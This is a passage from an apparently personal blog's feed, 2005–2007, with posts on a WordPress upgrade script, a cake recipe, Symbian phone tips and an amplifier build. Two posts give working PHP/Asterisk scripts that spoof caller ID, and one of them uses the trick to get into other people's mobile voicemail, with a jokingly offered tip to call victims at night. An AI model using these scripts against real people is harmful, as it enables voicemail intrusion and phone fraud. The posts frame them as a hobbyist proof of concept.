Downloading the newest wordpress&quot; wget -q http://wordpress.org/latest.tar.gz echo &quot;* Extrating the new wordpress&quot; tar zxf latest.tar.gz cd .. echo &quot;* Doing a bunch of directory and file juggling&quot; mv $webdir wordpress.backup_`date +&quot;%m-%d-%Y&quot;`/ mv wordpress.backup_`date +&quot;%m-%d-%Y&quot;`/ $archivedir/wordpress.backup_`date +&quot;%m-%d-%Y-%T&quot;` mv wp-backup_`date +&quot;%m-%d-%Y&quot;`/wordpress $webdir cp -af wp-backup_`date +&quot;%m-%d-%Y&quot;`/* $webdir/ cp -af wp-backup_`date +&quot;%m-%d-%Y&quot;`/.htaccess $webdir/ echo &quot;* Cleaning up&quot; rm -rf wp-backup_`date +&quot;%m-%d-%Y&quot;`/ echo &quot;* Backup placed in $archivedir/wordpress.backup_`date +&quot;%m-%d-%Y-%T&quot;`&quot; echo &quot;All upgraded. Run the upgrade script: /wp-admin/upgrade.php&quot;&lt;/blockquote&gt;


&lt;p&gt;So you drop this script into your domain root and then execute it. Here is the output from my most recent upgrade.&lt;/p&gt;

&lt;blockquote&gt;[jhr@destrukt nata2.org]$ sh wordress_upgrade.sh Wordpress upgrade script * Backing up wordpress db * Gzipping wordpress sql * Backing up the old wordpress * Downloading the newest wordpress * Extrating the new wordpress * Doing a bunch of directory and file juggling * Cleaning up * Backup placed in archive/wordpress.backup_03-31-2007-17:50:04 All upgraded. Run the upgrade script: /wp-admin/upgrade.php [jhr@destrukt nata2.org]$&lt;/blockquote&gt;


&lt;p&gt;Since it completely removes all the old files, except those in wp-content and wp-images it leads to less cruft and nonsense. It simply runs though and does what I would have done with my fingers, but automagically. You can &lt;a href=&quot;http://stuff.harperreed.org/v/code/wordpress_upgrader/f/wordress_upgrade-release.sh&quot;&gt;download the script at stuff.harperreed.org&lt;/a&gt;. So there yea go. Its really simple and quite easy. And it works great for upgrading my blogs. Let me know if it worked for you, or if you have any comments or suggestions.&lt;/p&gt;

&lt;p class=&quot;wlWriterSmartContent&quot; id=&quot;0767317B-992E-4b12-91E0-4F059A8CECA8:4aa8b25b-1fa2-4173-bbf9-60825aebbc8f&quot; contenteditable=&quot;false&quot; style=&quot;margin: 0px; padding: 0px; display: inline&quot;&gt;[tags]wordpress, upgrade, script, bash, automatic upgrade, php[/tags]&lt;/p&gt;



</content>



 </entry>
 
 <entry>
   <title>Chocolate Vegan Cake</title>
   <link href="http://www.nata2.org/2007/01/19/chocolate-vegan-cake/"/>
   <updated>2007-01-19T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2007/01/19/chocolate-vegan-cake</id>
   <content type="html">&lt;p&gt;So at lunch today we were talking about vegan food and I remembered this excellent vegan chocolate cake recipe that my family made for the holidays. It is so good. I remember when we had bunches of non-vegan cakes and pies - this one was always the first to get eaten (the majority of my family is not vegan). Soo good. Anyway - here is the recipe - straight from my mom:&lt;/p&gt;

&lt;blockquote&gt;&lt;strong&gt;Chocolate Vegan Cake&lt;/strong&gt; Ingredients:
&lt;ul&gt;
&lt;li&gt;1 1/2 cup flour&lt;/li&gt;
&lt;li&gt;1/3 cup cocoa powder&lt;/li&gt;
&lt;li&gt;1 teaspoon baking soda&lt;/li&gt;
&lt;li&gt;1/2 teaspoon salt&lt;/li&gt;
&lt;li&gt;1 cup sugar&lt;/li&gt;
&lt;li&gt;1/2 cup vegetable oil&lt;/li&gt;
&lt;li&gt;1 cup cold water&lt;/li&gt;
&lt;li&gt;2 teaspoons vanilla extract&lt;/li&gt;
&lt;li&gt;2 teaspoon vinegar&lt;/li&gt;
&lt;/ul&gt;
Directions: Preheat oven 375 degrees. Use small brownie sized pan, (no greasing required.) Mix all dry ingredients right in pan. Mix all wet ingredients in a separate bowl EXCEPT VINEGAR, (IMPORTANT.) Add wet ingredients to dry and stir until all dry ingredients are mixed. Add vinegar quickly and stir in&lt;/blockquote&gt;



</content>



 </entry>
 
 <entry>
   <title>Hacking mobile voicemail with Asterisk and caller ID spoofing</title>
   <link href="http://www.nata2.org/2006/09/24/hacking-voicemail-with-asterisk-and-caller-id-spoofing/"/>
   <updated>2006-09-24T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2006/09/24/hacking-voicemail-with-asterisk-and-caller-id-spoofing</id>
   <content type="html">&lt;p&gt;So there has always had a problem with US mobile providers having their voicemail be susceptible to being compromised by calling with a spoofed caller id. Apparently most providers caller id apps just checks the referring callerid - and doesn't force the voicemail user to pick a passcode; so it allows someone to trick the voicemail app into believing they are calling from a trusted number. This has been covered all &lt;a href=&quot;http://www.toast442.org/C662738431/E680925937/index.html&quot;&gt;over the&lt;/a&gt; &lt;a href=&quot;http://www.i-hacked.com/content/view/124/47&quot;&gt;Internet&lt;/a&gt; and was in the &lt;a href=&quot;http://www.macdevcenter.com/pub/a/mac/2005/01/01/paris.html&quot;&gt;spotlight&lt;/a&gt; awhile back when it was alleged that this was how &lt;a href=&quot;http://blog.tmcnet.com/blog/tom-keating/mobile-phones/paris-hilton-hacks-voicemail-using-asterisk.asp&quot;&gt;Paris Hilton's mobile phone was hacked&lt;/a&gt;. It is a pretty big problem and is probably really easy to fix. So, just to make things funnier - I decided that I would release a snippit of code that would make it easier to execute this hack.&lt;/p&gt;

&lt;blockquote&gt;#!/asterisk/php/bin/php -q &amp;lt;? set_time_limit(30); //make sure the php script doesn't time out require('phpagi.php'); // include the phpagi class error_reporting(E_ALL); // limit the errors $agi = new AGI(); // instantiate the AGI class $agi-&amp;gt;answer(); // answer the phone sleep(2); // wait a sec or two $agi-&amp;gt;stream_file('enter_spoof'); // speak a wav file that says &quot;enter the number&quot; $result = $agi-&amp;gt;get_data('beep', 3000, 10); // beep and grab the 10 numbers $agi-&amp;gt;verbose(&quot;Number to call:&quot;.$result['result']); // throw info so you know whats up $agi-&amp;gt;set_callerid($result['result']); // set caller id to the number you are calling $agi-&amp;gt;exec(&quot;Dial IAX2/iax-provider/1&quot;.$result['result']); // call the number ?&amp;gt;&lt;/blockquote&gt;


&lt;p&gt;You can add this to your /var/lib/asterisk/agi-bin dir and then specify the extension you want to use to dial and execute the php/agi script&lt;/p&gt;

&lt;blockquote&gt;exten =&amp;gt; 666,1,Answer exten =&amp;gt; 666,2,AGI(tmobilevoicemail_spoof.php) exten =&amp;gt; 666,3,Hangup&lt;/blockquote&gt;


&lt;p&gt;Then when you dial 666 it executes the script. It will ask you what number to dial then dial it after setting the caller id to the same number. It will dial the number and then ring the phone. If the phone is on and the target number is answered - it won't work; however if the person doesn't answer you will be placed in the targets voicemail as a trusted user. So, I would suggest calling people in the middle of the night or when you know they will not answer. Wait.. I actually wouldn't suggest calling anyone but yourself. It seems to me that the only viable solution that will be compatible with all phones, people and providers is to force the users to choose passcode to your voicemail. This is - of course - a proof of concept. You should not actually hack peoples voicemails. That is not very nice. We are into being nice. Also, check out my &lt;a href=&quot;http://www.nata2.org/2006/02/14/caller-id-spoofing-with-php-and-asterisk/&quot;&gt;previous entry on caller id spoofing&lt;/a&gt;.&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>38 S60 tips and tricks </title>
   <link href="http://www.nata2.org/2006/04/11/38-s60-tips-and-tricks/"/>
   <updated>2006-04-11T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2006/04/11/38-s60-tips-and-tricks</id>
   <content type="html">&lt;div style=&quot;text-align: center&quot;&gt;
&lt;p align=&quot;left&quot;&gt;So now that everyone is finally interested in getting a symbian phone - i decided to unearth some tricks and what not for symbian phones.&lt;/p&gt;
&lt;div align=&quot;left&quot;&gt;
&lt;p align=&quot;left&quot;&gt;I have tried most of these. I am not quite sure where i got this list - probably from some yahoo group or some site years ago when i got my 7610. Most of it works on my N70 so it should all be still current.&lt;/p&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align: center&quot;&gt;&lt;!--adsense--&gt;&lt;/div&gt;
&lt;strong&gt;Tip 1 - Do you know how to use the edit button (abc or pencil button)?&lt;/strong&gt; Heres how... in the inbox for example; you wanna delete multiple SMS, simply hold the edit button, scroll down, and then, press c to delete the marked SMS. The edit button can also be used to copy and past text in SMS, simply hold it and scroll across, choose copy. &lt;strong&gt;Tip 2 - How to reset your password&lt;/strong&gt; Press *#7370#, then enter the lock code, which is the sec code of the phone. NOTE: battery must be full, else if format is disrupted by low battery, consequences will be disastrous for 6600 users, to format the phone, theres an alternative way. Press and hold &amp;lt;3&amp;gt;, &amp;lt;*&amp;gt;, and the buttons, then power on phone, keep holding on the 3 buttons, till you come to a format screen. this method ONLY works on 6600, and need not enter the sec code. BUT sec code won't be reset to default 12345. &lt;strong&gt;Tip 3 - installing .sis files simply using the cable&lt;/strong&gt; Just plug it in, place the .sis file anywhere on e: (the MMC), not in any folders, root of e:, disconnect, then look for it in manager. &lt;strong&gt;Tip 4 &amp;ndash; Task Menu&lt;/strong&gt; Save on battery and system memory being used by regularly checking the task manager which can be accessed by holding down the menu button!! &lt;strong&gt;Tip 4a&lt;/strong&gt; - Set the screen saver to a short time out period to prolong battery life. &lt;strong&gt;Tip 4b&lt;/strong&gt; - Avoid restarting the phone, or repeatedly turning it on and off. This helps increase battery life. &lt;strong&gt;Tip 5 &amp;ndash; IMEI Number&lt;/strong&gt; Type *#06# to display your IMEI serial number, very valuable for the unlocking your phone to other sim cards &lt;strong&gt;Tip 6 &amp;ndash; Firmware Version&lt;/strong&gt; Type *#0000# to view which firmware version you are running &lt;strong&gt;Tip 7 &amp;ndash; Avoid being bluejacked&lt;/strong&gt; If you would like to avoid being &quot;blue jacked&quot;, keep bluetooth turned off, or set your phone's visibility to hidden. &lt;strong&gt;Tip 8 - Make your phone a watch&lt;/strong&gt; Don't want to carry a watch and a phone? Set the screen saver to show date and time, then you can ditch the watch. &lt;strong&gt;Tip 9 &amp;ndash; Save memory while installing apps&lt;/strong&gt; Save memory when installing apps, by installing over bluetooth. This can be done using the nokia phone suite and a bluetooth serial connection. Only works with .SIS files, so java still has to be sent to the phone, but will save space when using .SIS files. &lt;strong&gt;Tip 10 - Operator logos&lt;/strong&gt; Use a filemanager like FExplorer or SeleQ to add the folders: &quot;c:/system/Apps/phone/oplogo&quot;. Add a .bmp picture to folder &quot;oplogo&quot; and restart your phone! The .bmp picture size needs to be: 97 x 25 pixels &lt;strong&gt;Tip 11 - Check if the recipients phone is on&lt;/strong&gt; Delivery reports or Type *0# your message in the message composer window space then write your message, the recipient will not see the star zero hash bit - just the message When they read it it will relay a message back to your phone showing the time they received it. (haven't yet tried it myself though) &lt;strong&gt;Tip 12 - BlueJacking&lt;/strong&gt; First up, you need to know what Bluetooth is. There are lots of types of modern devices that incorporate Bluetooth as one of their many features. PDAs, mobile phones and laptops are a few of these modern devices. Bluetooth means that Bluetooth enabled devices can send things like phonebook/address book contacts, pictures &amp;amp; notes to other Bluetooth enabled devices wirelessly over a range of about 10 metres. So, we've got past the boring part. Now, using a phone with Bluetooth, you can create a phonebook contact and write a message, eg. 'Hello, you've been bluejacked', in the 'Name' field. Then you can search for other phones with Bluetooth and send that phonebook contact to them. On their phone, a message will popup saying &quot;'Hello, you've been bluejacked' has just been received by Bluetooth&quot; or something along those lines. For most 'victims' they will have no idea as to how the message appeared on their phone. &lt;strong&gt;Tip 13: Gallery Shortcut Keys&lt;/strong&gt; While you are viewing a picture in your phone's gallery, press one of these shortcut keys (definitely works on 6600, not sure about other symbians) 1 - turn image anticlockwise 3 - turn image clockwise * - toggle on/off of full screen 5 - zoom in 0 - zoom out &lt;strong&gt;Tip 16: A soft and Hard reset&lt;/strong&gt; A Soft-reset - the process of resetting all the settings of the phone to the factory default! No applications are deleted! A Hard-reset is like formatting a drive! It does format the memory. Everything that has been installed after the first use of the phone is deleted! It will recover the memory of the phone to the state you purchased it! It is done by inputing the following code: *#7370# NOTE: The battery must be full or the charger has to be connected to the phone so that it does not run out of power and make the phone unusable. &lt;strong&gt;Tip 17: Formats of images&lt;/strong&gt; supported ones: JPG UPF GIF87a/89a WBMB MBM TIFF/F PNG EXIF How to copy &amp;amp; paste text in your Nokia 3650: Press and hold the pencil key and select your text using the scroll key. Left function key will change to 'Copy'. Press it to copy the selected text to clipboard. You can paste the clipboard contents the same way: press and hold the pencil key and press 'Paste'. Or, press pencil key once and select 'Paste'. Press and hold the Menu key to open the application switching window, where you can *duh* switch between applications. &lt;strong&gt;Tip 18: Hanging Program&lt;/strong&gt; If a program hangs and you can't shut it down, select the application in the application switching window and press 'C' to kill it. It's also a faster way to exit programs. &lt;strong&gt;Tip 19: Quiet your camera shutter&lt;/strong&gt; Turn on/off the &quot;click&quot; sound made by the camera by selecting the 'Silent' profile or by turning warning tones on/off: Menu &amp;gt; Profiles &amp;gt; &quot;select your activated profile&quot; &amp;gt; Personalize &amp;gt; Warning tones &amp;gt; On/Off. (This also effects the sound of Java games and apps).
&lt;div style=&quot;text-align: center&quot;&gt;&lt;!--adsense--&gt;&lt;/div&gt;
&lt;strong&gt;Tip 20: Background Image&lt;/strong&gt; To change background image go to: Menu &amp;gt; Tools &amp;gt; Settings &amp;gt; Phone &amp;gt; Standby mode &amp;gt; Background image &amp;gt; Yes &amp;gt; &quot;choose an image&quot;. The best size for background images is 174x132 pixels.&lt;strong&gt;Tip 21: Contact Image&lt;/strong&gt; Display an image when someone's calling: Menu &amp;gt; Contacts &amp;gt; &quot;select a contact card&quot; &amp;gt; Options &amp;gt; Edit &amp;gt; Options &amp;gt; Add thumbnail &amp;gt; &quot;choose an image&quot;. &lt;strong&gt;Tip 22: Contact Ringtone&lt;/strong&gt; Add a personal ringing tone to a contact: Menu &amp;gt; Contacts &amp;gt; &quot;select a contact card&quot; &amp;gt; Options &amp;gt; Open &amp;gt; Options &amp;gt; Ringing tone &amp;gt; &quot;choose a ringing tone&quot;. &lt;strong&gt;Tip 23: Delete all messages in your inbox&lt;/strong&gt; Delete all messages from your Inbox at once: Menu &amp;gt; Messaging &amp;gt; Inbox &amp;gt; Options &amp;gt; Mark/Unmark &amp;gt; Mark all &amp;gt; Options &amp;gt; Delete. &lt;strong&gt;Tip 24: Hide Caller ID&lt;/strong&gt; Send or hide your caller ID: Go to: Menu &amp;gt; Tools &amp;gt; Settings &amp;gt; Call &amp;gt; Send My Caller ID &amp;gt; 'Yes', 'No' or 'Set By Network' to follow the default settings of your home network. &lt;strong&gt;Tip 25: Copying large files?&lt;/strong&gt; If you often copy large files to your MultiMedia Card, I recommend a card reader. &lt;em&gt;E.g.&lt;/em&gt; With a card reader it takes only 12 seconds to copy a 10 MB file! &lt;strong&gt;Tip 26: Record a phone call&lt;/strong&gt; Record the sound of a phone call using the (sound) Recorder. Menu &amp;gt; Extra's &amp;gt; Recorder &amp;gt; Options &amp;gt; Record sound clip. Note: short beeps are audible during call registration. But there is a 60 second limitation so if you want unlimited sound recording get this app: Extended Recorder. &lt;strong&gt;Tip 27: Switch dictionary On/Off&lt;/strong&gt; While writing text, press &quot;#&quot; to switch between upper and lower case and Dictionary on/off (predictive text input). &lt;strong&gt;Tip 30: Switch between alpha and numeric mode&lt;/strong&gt; Press and hold &quot;#&quot; to switch between Alpha mode and Number mode. &lt;strong&gt;Tip 31: Keyboard shortcuts for zooming and rotating images in Images:&lt;/strong&gt; 1 = zoom in 0 = zoom out, press and hold to return to the normal view 2 = rotate anticlockwise 9 = rotate clockwise * = full screen In standby mode, press and hold the right soft key to activate voice dialing. &lt;strong&gt;Tip 32: Add a voice tag&lt;/strong&gt; To add a voice tag to a phone number, open a contact card and scroll to the phone number and select: Options &amp;gt; Add voice tag. &lt;strong&gt;Tip 33: Customize soft keys&lt;/strong&gt; You can customize both soft keys located below the screen (in standby mode): Menu &amp;gt; Tools &amp;gt; Settings &amp;gt; Phone &amp;gt; Standby mode &amp;gt; Left/Right selection key &amp;gt; &quot;select an application&quot;. &lt;strong&gt;Tip 34: Standby Mode -&amp;gt; Contacts&lt;/strong&gt; In standby mode. press scroll key center (joystick) to go directly to Contacts. &lt;strong&gt;Tip 35: Standby Mode -&amp;gt; WAP Home Page&lt;/strong&gt; In standby mode, press and hold 0 to launch your wap home page. &lt;strong&gt;Tip 36: Launch a specific application based on space&lt;/strong&gt; In Menu or any subfolder, press numbers 1 - 9 to start the application at that location. 123 456 789 &lt;strong&gt;Tip 37: Dial a specific number&lt;/strong&gt; In standby mode, 45# + dials the number on your sim in memory slot 45. 50# + dials slot 50 and so on. &lt;strong&gt;Tip 38: Turn on back light while keypad is locked&lt;/strong&gt; If you have your keylock activated just press the on/off button to turn on your backlight to look at the time when it's dark without having to unlock the keypad.
&lt;div style=&quot;text-align: center&quot;&gt;&lt;!--adsense--&gt;&lt;/div&gt;

</content>



 </entry>
 
 <entry>
   <title>Caller id spoofing with PHP and asterisk</title>
   <link href="http://www.nata2.org/2006/02/14/caller-id-spoofing-with-php-and-asterisk/"/>
   <updated>2006-02-14T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2006/02/14/caller-id-spoofing-with-php-and-asterisk</id>
   <content type="html">&lt;p&gt;I have cleaned up and commented a little hack i did for my home asterisk server - allowing a person to dial an extension and then be walked through spoofing caller id on a call. It is a ridiculously easy hack to engage. I was surprised and a bit concerned at what this means in regards to trust and telephony. I mean, if a hobbyist is able to spoof caller id on a phone call to anywhere with nothing more than &lt;a href=&quot;http://asteriskathome.sourceforge.net/&quot;&gt;asterisk@home&lt;/a&gt; and &lt;a href=&quot;http://www.vmware.com/products/server/&quot;&gt;vmware&lt;/a&gt;.. what is to stop someone from setting something like this up and stealing credit cards or social security numbers using some crazy &lt;a href=&quot;http://en.wikipedia.org/wiki/Social_engineering_%28computer_security%29&quot;&gt;social engineering&lt;/a&gt;.. i guess nothing.. So anyway, i released &lt;a href=&quot;http://asteriskathome.sourceforge.net/&quot;&gt;my source code&lt;/a&gt;. It is really really simple and based entirely on one small block of code. The basic idea is:&lt;/p&gt;

&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;small&gt;Prompt user for input (spoofed number)&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Grab 10 digits (spoofed number)&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Prompt user for input (number to call)&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Grab 10 digits (number to call)&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Set caller idea based on input in step 1 and 2&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Make call to number from input in step 3 and 4&lt;/small&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;


&lt;p&gt;As you can see the idea is pretty simple. get input. set callerid. make call. The code is just as simple:&lt;/p&gt;

&lt;blockquote&gt;&lt;small&gt;&lt;span style=&quot;font-style: italic&quot;&gt;//(step 1) Prompt user for input&lt;/span&gt; $agi-&amp;gt;stream_file('enter_spoof'); &lt;span style=&quot;font-style: italic&quot;&gt;//(step 2) Grab 10 digits&lt;/span&gt; $result = $agi-&amp;gt;get_data('beep', 3000, 10); &lt;span style=&quot;font-style: italic&quot;&gt;//set variables and output debug info&lt;/span&gt; $spoofnumber= $result['result']; $agi-&amp;gt;verbose(&quot;Spoof Number:&quot;.$spoofnumber);&lt;/small&gt; &lt;small&gt;&lt;span style=&quot;font-style: italic&quot;&gt;//(step 3) Prompt user for input&lt;/span&gt; $agi-&amp;gt;stream_file('call_spoof'); &lt;span style=&quot;font-style: italic&quot;&gt;//(step 4) Grab 10 digits&lt;/span&gt; $result = $agi-&amp;gt;get_data('beep', 3000, 10); &lt;span style=&quot;font-style: italic&quot;&gt;//set variables and output debug info&lt;/span&gt; $callnumber= $result['result']; $agi-&amp;gt;verbose(&quot;Number to call:&quot;.$callnumber); &lt;span style=&quot;font-style: italic&quot;&gt;//(step 5) Set callerid to whatever the input was in step 2&lt;/span&gt; $agi-&amp;gt;set_callerid($spoofnumber); &lt;span style=&quot;font-style: italic&quot;&gt;//(step 6) Make call to number from input in step 3 and 4 $agi-&amp;gt;exec(&quot;Dial IAX2/yourpassword@provider/1&quot;.$callnumber);&lt;/span&gt;&lt;/small&gt;&lt;/blockquote&gt;


&lt;p&gt;The agi interface to asterisk obviously hides a lot of the complex stuff that asterisk does in the background - but still - the code is insanely simple. even with user interaction. A lot of features could be added - password; callerid checking to make sure only valid users are using the app; call back - so if you call it and set up your spoof, it calls back your number to make sure you who you say you are. or whatever ;) a lot of options are available. With a little bit of expansion - i think someone could easily make a robust callerid spoofing application for criminals and not criminals. it is easy enough for anyone to do. Check out my code here: &lt;a href=&quot;http://stuff.harperreed.org/?path=code%2Fasterisk_callerspoof_php&amp;amp;text=asterisk_callerspoof.phps&quot;&gt;asterisk_callerspoof&lt;/a&gt; What i have done is nothing new - there is a great article about all this: &lt;a href=&quot;http://www.rootsecure.net/?p=reports/callerid_spoofing&quot;&gt;Automated Caller ID / ANI Spoofing&lt;/a&gt; asterisk and php rule.&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>I am going to Haxor my t-amp. Super Klasse</title>
   <link href="http://www.nata2.org/2005/10/27/i-am-going-to-haxor-my-t-amp-super-klasse/"/>
   <updated>2005-10-27T00:00:00-05:00</updated>
   <id>http://www.nata2.org/2005/10/27/i-am-going-to-haxor-my-t-amp-super-klasse</id>
   <content type="html">&lt;p&gt;So. I have been at work a lot lately. So my amp mod is pretty dope. Although i get a fierce hum when i charge the battery - i have decided to move forward and build the rest of it. I think i am going to build four distinct parts. First the power supply. i am thinking that the power supply should be completely separate from all of the other components - mostly cuz it is totally noise causing and i will be able to replace it if needed. I do like how clean and portable the battery power is - so i will keep that and then make the trickle charger just charge it always. I would like to place a digital or analog voltage meter on the front to make sure that the voltage is correct and that the battery is charged. I think something real flashy wil be nice. like a simple digital display with a blue LED backlight. It will rule. The second component will be the preamp/input switch - this will be a simple simple preamp. The tirck will be that the volume pot will be motorized to control the volume via a microcontroller - this will allow me to have a remote. god i need a remote. then i will also add twin VU meters - not real real vu meters, but somethign that will allow me to view the levels for each channel. once again - something kinda flashy. i think that really nice analog VUish meters woudl be nice - with that really dim seventies light. Something simple though. The third component would be the phono preamp. It would a really chilled out active/passive phono preamp that would allow me to hook my turntable(1200 w00t) to my preamp/amp. that is all. The fourth and probable most important part of the equation would be the amp. i would take the pot off the amp and make it just be an amp. nothing more. i will possibly use the sonic impact t-amp - but maybe upgrade to something with a bit power so i don't have to use crazy crazy speakers for it to soudn good. A probably pseudo parts list:&lt;/p&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;small&gt;Power Supply&lt;/small&gt;
&lt;ul&gt;
&lt;li&gt;&lt;small&gt;12.x V Battery&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Trickle Charger&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Voltage meter&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Power switch&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Charge/Battery toggle&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Four Power outs&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;blue led status light&lt;/small&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Preamp/Switcher&lt;/small&gt;
&lt;ul&gt;
&lt;li&gt;&lt;small&gt;Remote, microcontroller controller potentiometer&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;multiple step potentiometer&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;4 inputs&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;12v power input for remote&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;2 (left/right) VU meters&lt;/small&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Amp&lt;/small&gt;
&lt;ul&gt;
&lt;li&gt;&lt;small&gt;amp (some tripath amp - probably si t-amp)&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;2 line input&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;4 speaker posts&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;12V in&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;blue led status light&lt;/small&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;small&gt;Phono Preamp&lt;/small&gt;
&lt;ul&gt;
&lt;li&gt;&lt;small&gt;12V in&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;2 line in (phono )&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;2 line out&lt;/small&gt;&lt;/li&gt;
&lt;li&gt;&lt;small&gt;blue led status light&lt;/small&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;


&lt;p&gt;I think that this project rules and is totally teaching me more about electronics. i mean - i took the classes and have done shit with microcontrollers - but i like this application crap. it rules. so there.&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>long ago</title>
   <link href="http://www.nata2.org/2005/03/12/long_ago/"/>
   <updated>2005-03-12T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2005/03/12/long_ago</id>
   <content type="html">&lt;p&gt;i had these pictures forever - but I was unable to put them up. first I thought I lost my camera battery. then I found it. then I was dumb. then dumber. then I figured it all out. for the record. iphoto is not better than picasa. picasa is real real nice. the absolute integration of iphoto is dope. but picasa is better. a lot better. heh.&lt;/p&gt;


&lt;p&gt;so here are some pictures from awhile ago:&lt;/p&gt;


&lt;p&gt;&lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2005%3A02%3A25_Crobar_felix&quot;&gt;Felix at crobar&lt;/a&gt; and &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2005%3A02%3A24_Soundbar_ThrillKillKult&quot;&gt;thrillkill kult at soundbar&lt;/a&gt;&lt;/p&gt;


&lt;p&gt;fun fun.&lt;/p&gt;


&lt;p&gt;I have to change browsers now. stupid safari.&lt;/p&gt;



</content>



 </entry>
 
 <entry>
   <title>life ON mars</title>
   <link href="http://www.nata2.org/2005/02/16/life_ON_mars/"/>
   <updated>2005-02-16T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2005/02/16/life_ON_mars</id>
   <content type="html">&lt;p&gt;&lt;a href=&quot;http://www.space.com/scienceastronomy/mars_life_050216.html&quot;&gt;here&lt;/a&gt; and then &lt;a href=&quot;http://www.space.com/imageoftheday/image_of_day_050111.html&quot;&gt;this thing&lt;/a&gt;... we are doomed. more appropriatly - theology is doomed. stupid single world theory. always getting in the way. if we find intelligent life we will at least know that it exists &lt;a href=&quot;http://legis.state.nm.us/Sessions/05%20Regular/bills/senate/SB0291.html&quot;&gt;somewhere&lt;/a&gt;.&lt;br&gt;&lt;/p&gt;

&lt;br&gt;


&lt;p&gt;brb. work.&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>xmlhttp. tiddlywiki. new design. other stuff</title>
   <link href="http://www.nata2.org/2005/02/10/xmlhttp__tiddlywiki__new_design__other_stuff/"/>
   <updated>2005-02-10T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2005/02/10/xmlhttp__tiddlywiki__new_design__other_stuff</id>
   <content type="html">&lt;p&gt;heh. &lt;a href=&quot;http://www.dopeman.org/nata2&quot;&gt;check out&lt;/a&gt; my new design. it is almost done. I need to fancy it up a bit and tweak it a little bit. but for the most part it is near completion.&lt;br&gt;&lt;/p&gt;

&lt;br&gt;


&lt;p&gt;also check out &lt;a href=&quot;http://43things.com&quot;&gt;43 things&lt;/a&gt; - a really really cool idea. I think I will integrate it with my new blog design. I also want to make a friends section like nick whatever's blog - which I don't want to find right now. I need to rethink my design a bit. but I am happy so far. to load peoples rss I am thinking about using xmlhttp or something. it should rule.&lt;br&gt;&lt;/p&gt;

&lt;br&gt;


&lt;p&gt;i am also thinking about combining &lt;a href=&quot;http://www.tiddlywiki.com/&quot;&gt;tiddywiki&lt;/a&gt; and xmlhttp to create a super fancy smooth javascript notepad for my site. it should rule.&lt;br&gt;&lt;/p&gt;

&lt;br&gt;


&lt;p&gt;also check out my friend kevi's site: &lt;a href=&quot;http://www.slimkevi.com/&quot;&gt;slimkevi&lt;/a&gt;. he is trying to lose a bunch of weight. the site is totally awesome. good luck. I hope he finds himself successful.&lt;br&gt;&lt;/p&gt;

&lt;br&gt;


&lt;p&gt;having reread my entry - I realized I am incredibly tired and need to goto bed. gnight.&lt;/p&gt;
</content>



 </entry>
 
 <entry>
   <title>of course.</title>
   <link href="http://www.nata2.org/2005/02/06/of_course_/"/>
   <updated>2005-02-06T00:00:00-06:00</updated>
   <id>http://www.nata2.org/2005/02/06/of_course_</id>
   <content type="html">&lt;p&gt;so tomorrow is the day. when the site will go live. I am pretty excited. ;)&lt;br&gt;&lt;/p&gt;

&lt;br&gt;


&lt;p&gt;more later.&lt;/p&gt;
</content>



 </entry>
 
 
</feed>
